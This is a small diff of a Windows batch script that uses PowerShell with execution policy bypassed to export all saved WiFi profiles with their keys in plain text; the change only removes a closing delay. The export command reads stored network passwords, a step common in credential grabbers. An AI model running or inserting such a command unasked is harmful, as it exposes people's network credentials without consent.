@@ -36,8 +36,7 @@ CALL :logger "Find WiFi-Connections","w"
 powershell -Executionpolicy Bypass -Command "netsh wlan export profile key=clear" >nul
 
 CALL :logger "Wifi-Connections safed successfull","g"
-CALL :logger "Closing after two second","b"
-ping localhost -n 2 >nul
+CALL :logger "Closing...","b"
 
 exit
 
